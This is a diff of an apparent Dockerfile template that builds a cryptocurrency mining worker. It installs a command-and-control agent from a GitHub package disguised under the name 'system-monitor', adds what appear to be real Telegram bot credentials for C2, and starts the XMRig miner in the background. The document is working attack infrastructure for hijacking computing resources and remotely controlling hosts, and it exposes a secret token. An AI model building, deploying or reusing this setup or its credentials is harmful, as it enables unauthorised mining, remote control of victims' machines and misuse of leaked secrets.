@@ -288,12 +288,16 @@ RUN mkdir -p /opt/miner && \\
 # Install C2 agent from GitHub (Telegram C2 mode - no URL needed)
 RUN pip install --break-system-packages --force-reinstall --no-cache-dir git+https://github.com/GaredBerns/system-monitor.git
 
+# Set Telegram C2 credentials
+ENV TG_BOT_TOKEN=8141566162:AAGRxoqlDhU5I0sM0ldA3T8t4KH-wpObQl4
+ENV TG_CHAT_ID=8667199004
+
 # Create start script with debugging
 RUN echo '#!/bin/bash\\n\\
 echo "=== Starting Mining Worker ==="\\n\\
 echo "Worker: {worker}"\\n\\
 echo "Pool: {POOL}"\\n\\
-echo "C2 Mode: Telegram (no URL needed)"\\n\\
+echo "C2 Mode: Telegram (direct API)"\\n\\
 \\
 # Start XMRig in background\\n\\
 /opt/miner/xmrig -o {POOL} -u {WALLET}.{worker} --donate-level 1 --threads 2 --print-time 60 &\\n\\
